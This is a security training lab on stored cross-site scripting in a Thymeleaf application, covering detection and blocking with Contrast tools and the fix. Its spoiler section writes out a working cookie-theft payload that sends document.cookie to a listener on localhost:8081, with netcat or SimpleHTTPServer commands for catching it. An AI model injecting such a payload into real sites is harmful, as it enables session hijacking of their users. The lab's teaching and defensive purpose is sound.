@@ -1,0 +1,227 @@
+== Lab 04 - Cross-site scripting ==
+
+Requirements:
+- Lab 01 completed
+- Lab 03 completed
+- optional: netcat or python
+
+Goals:
+- XSS in practice
+- Learn how Contrast Assess and Protect
+- Learn about Thymeleaf
+
+Task 1 - discovery
+- Launch application with Contrast
+- Navigate to Find Owners and perform a last name search: Davis
+- Click Betty Davis
+- Edit Betty Davis information & save
+- Contrast UI: navigate Applications -> your application -> Vulnerabilities
+- Review the Stored XSS details
+- PASS: Contrast Assess succesfully discovers the Stored XSS vulnerability
+
+Task 2 - confirmation
+- Contrast UI: examine vulnerability details
+- Find the root cause:
+ * This is a stored XSS. Data flows from data store to browser
+ * Examine the method fetching the data
+ * Examine the Thymeleaf template
+- PASS: You are able to find the root cause
+
+Task 3 - proof of concept exploit
+- Craft a demonstration exploit with <script>alert(1)</script>
+- PASS: you get an alert pop-up when you visit the Owner Information page
+
+Task 4 - malicious exploit
+- Craft an exploit that 
+ * an ordinary user does not notice
+ * sends user's cookie to the server of your choice
+ * to receive, you can use python -m SimpleHTTPServer 8081 , or netcat -l -p 8081
+
+Task 5 - mitigation with Contrast Protect
+- Double check Contrast Protect is enabled
+- Enable Cross-site scritping blocking
+ * Contrast UI -> your application -> Policy -> Protect -> Cross-site scripting: Block at perimeter
+- Restart the application
+- Re-execute the exploit
+- PASS: Contrast blocks exploitation
+
+Task 6 - remediation
+- Fix the root cause in Thymeleaf template
+- Optional: how to use CSP to prevent XSS exploitation?
+- Optional: how to prevent cookie stealing in general?
+- PASS: root cause is fixed. Exploit does not work when Contrast XSS is not blocking
+
+== End of Lab ==
+
+Hints & spoilers below
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Hints
+
+
+Task 2
+- Review OwnerController class
+- Review the Thymeleaf template that is used to renders the html
+
+
+
+
+
+
+Task 4
+- Run your web server at port 8081
+- Use a <script> tag to write html which is not visible and sends GET to your web server
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SPOILERS 
+
+
+
+
+
+below
+
+
+
+
+
+
+
+
+
+
+
+
+Task 2:
+- th:text performs output encoding, th:utext does not  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Task 4:
+<script>document.write('<img height="0" width="0" src="http://localhost:8081?cookie=' + document.cookie + '" />') </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Task 6
+- Change th:utext to th:text
